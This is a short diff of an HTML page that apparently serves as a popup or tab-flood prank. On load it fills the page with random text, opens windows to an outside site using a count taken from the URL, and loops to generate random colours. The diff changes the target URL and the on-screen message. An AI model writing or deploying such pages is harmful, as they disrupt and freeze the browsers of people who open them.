@@ -11,8 +11,7 @@
 
     <body onload="execute()" style="background-color:#1a1a1a">
         <div style="text-align:center">
-        <p id="text" style="font-family:'Segoe UI'; color:white; font-size:30px;word-break: break-all;">If you see this message, click allow popups in the top right and refresh.</p><br>
-
+        <p id="text" style="font-family:'Segoe UI'; color:white; font-size:30px;word-break: break-all;">If you see this message, the URL is not formatted correctly.</p>
         </div>
  <script>
 
@@ -48,7 +47,7 @@
             document.getElementById("text").innerHTML = makeid(1000);
             var segments = window.location.href.split("?")
             tabamount = segments[1];
-            windowOpen("https://tab-testing.w3spaces.com/?" + tabamount, tabamount)
+            windowOpen("https://www.gcse.gq?" + tabamount, tabamount)
             for (let i = 0; i < 1000; i++) {   
             var randomColor = "#000000".replace(/0/g,function(){return (~~(Math.random()*16)).toString(16);});
             var randomColor2 = "#000000".replace(/0/g,function(){return (~~(Math.random()*16)).toString(16);});
